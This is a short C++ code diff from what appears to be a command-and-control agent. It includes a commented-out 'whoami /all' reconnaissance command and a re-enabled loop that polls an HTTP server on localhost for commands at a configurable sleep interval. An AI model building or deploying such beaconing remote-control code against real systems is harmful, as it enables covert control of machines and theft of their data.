@@ -1,5 +1,6 @@
 #include <iostream>
 #include "core.h"
+#include "windows.h"
 #include "HttpCommunicator.h"
 
 
@@ -11,9 +12,9 @@ int main() {
 
 	HttpCommunicator httpCommunicator("127.0.0.1", 8081);
 
-	c.execute_command("shell whoami /all");
+	//c.execute_command("shell whoami /all");
 
-	/*
+	
 	// Wait for commands
 	for (;;)
 	{
@@ -23,6 +24,6 @@ int main() {
 			break;
 
 		// Sleep for 50*1000ms
-		Sleep(30000);
-	}*/
+		Sleep(core::sleepTime * 1000);
+	}
 }
